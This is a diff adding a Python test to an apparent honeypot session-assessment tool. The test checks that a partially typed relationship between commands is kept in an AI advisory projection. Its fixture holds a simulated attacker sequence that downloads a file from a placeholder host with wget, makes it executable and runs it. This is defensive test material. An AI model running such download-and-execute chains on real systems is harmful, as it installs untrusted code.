@@ -67,6 +67,41 @@ def _report(*, command: str = "uname -a") -> dict:
     )
 
 
+def test_partial_typed_relationship_is_preserved_in_ai_projection() -> None:
+    commands = [
+        "wget http://example.com/a -O /tmp/a",
+        "chmod 700 /tmp/a",
+        "/tmp/a",
+    ]
+    events = [
+        {
+            "session": "ai-partial-relationship",
+            "timestamp": f"2026-08-08T10:00:0{index}Z",
+            "eventid": "cowrie.command.input",
+            "input": command,
+        }
+        for index, command in enumerate(commands)
+    ]
+    report = build_session_assessment_v4(
+        [{"session_id": "ai-partial-relationship", "commands": commands, "raw_events": events}],
+        raw_events=events,
+        behavior_policy_path=str(BEHAVIOR_POLICY),
+        classification_policy_path=str(CLASSIFICATION_POLICY),
+    )
+    assert any(
+        item["status"] == "partial"
+        for item in report["canonical_evidence"]["semantic_graph"]["relationship_edges"]
+    )
+    policy, policy_sha256, _ = load_ai_advisory_policy()
+    projection = build_ai_advisory_projection(
+        report, policy=policy, policy_sha256=policy_sha256
+    )
+    assert any(item["status"] == "partial" for item in projection["relationships"])
+    assert validate_ai_advisory_projection(
+        projection, policy=policy, policy_sha256=policy_sha256
+    ) == projection
+
+
 def _context() -> tuple[dict, dict, dict, str]:
     report = _report()
     policy, policy_sha256, _path = load_ai_advisory_policy()
